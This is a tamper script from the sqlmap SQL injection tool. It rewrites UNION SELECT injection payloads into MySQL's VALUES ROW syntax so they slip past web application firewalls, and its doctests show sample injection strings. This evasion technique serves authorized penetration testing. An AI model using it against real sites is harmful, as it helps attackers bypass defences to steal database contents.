#!/usr/bin/env python

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

import os
import re

from lib.core.common import singleTimeWarnMessage
from lib.core.enums import DBMS
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.HIGHEST

def dependencies():
    singleTimeWarnMessage("tamper script '%s' is only meant to be run against %s" % (os.path.basename(__file__).split(".")[0], DBMS.MYSQL))

def tamper(payload, **kwargs):
    """
    Replaces UNION SELECT <columns> with the (MySQL) table value constructor UNION VALUES ROW(<columns>)

    Requirement:
        * MySQL >= 8.0.19

    Tested against:
        * MySQL 8.0.46, 8.4.9

    Notes:
        * Useful to bypass web application firewalls keying on the 'UNION.*SELECT' pair, as the
          resulting payload carries no SELECT token at all
        * MySQL mandates the ROW keyword here, while MariaDB and the other engines supporting a
          standalone VALUES query reject it (see tamper script 'unionvalues')
        * A table value constructor takes no FROM clause, hence payloads carrying one (e.g. those
          produced by --union-from) are deliberately left untouched

    >>> tamper('-1 UNION ALL SELECT NULL,CONCAT(0x716b6a7671,0x41,0x7170707671),NULL-- -')
    '-1 UNION ALL VALUES ROW(NULL,CONCAT(0x716b6a7671,0x41,0x7170707671),NULL)-- -'
    >>> tamper('-1 UNION SELECT 45,45#')
    '-1 UNION VALUES ROW(45,45)#'
    >>> tamper('-1 UNION ALL SELECT NULL,NULL FROM DUAL-- -')
    '-1 UNION ALL SELECT NULL,NULL FROM DUAL-- -'
    """

    def _(match):
        columns = match.group("columns").rstrip()

        if re.search(r"(?i)\bFROM\b", columns):
            return match.group(0)

        return "%s%s VALUES ROW(%s)" % (match.group("union"), match.group("all") or "", columns)

    return re.sub(r"(?i)(?P<union>UNION)(?P<all>\s+ALL)?\s+SELECT\s+(?P<columns>.+?)(?=(?:--|#|/\*)|$)", _, payload) if payload else payload
